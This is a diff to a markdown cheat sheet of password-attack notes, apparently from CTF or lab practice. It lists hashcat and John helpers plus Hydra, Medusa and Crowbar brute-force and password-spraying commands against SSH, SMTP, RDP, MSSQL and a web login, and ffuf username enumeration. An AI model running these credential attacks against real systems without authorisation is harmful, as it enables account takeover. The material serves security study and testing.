@@ -11,7 +11,9 @@
 ## Hashcat
 - Identify hash
   - hashid -m HASH
-  - hashidentifier
+    - -j JOHN format
+    - -m HASHCAT mode
+  - hash-identifier: hash
 
 - wordlist
   - hashcat target /path/to/word/list
@@ -35,7 +37,6 @@
 
 - zip2john file.zip > zip.hasj
 - ssh2john key > key.hash
-
 
 ## Hydra
 - hydra -l username -P wordlist.txt server service
@@ -77,13 +78,17 @@ hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.
   - hydra -l [USERNAME] -P password.lst ftp://IP:PORT
 
 - SMPT
-  - -l email@address.com -P [Password_List] smtp://IP -v
+  - hydra -l email@address.com -P [Password_List] smtp://IP -v
+  - hydra -L users.txt -p 'PASS' -f $TARGET pop3/smtp/imap4
 
 - SSH
-  - -L [USER_LIST] -P [PASS_LIST] ssh://IP -v
+  - hydra -L [USER_LIST] -P [PASS_LIST] ssh://IP -v
 
 - MSSQL
-  -  hydra -L user.txt –P pass.txt $TARGET mssql
+  - hydra -L user.txt –P pass.txt $TARGET mssql
+  
+- rdp
+  - hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 
 - Default Usernames:
 ```
@@ -91,8 +96,11 @@ root
 admin
 ```
 
-# Medusa
+## Medusa
 - medusa -U user -P pass -h $TARGET -M ftp
+
+## Crowbar
+- crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 
 ## User enumeration
 -  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
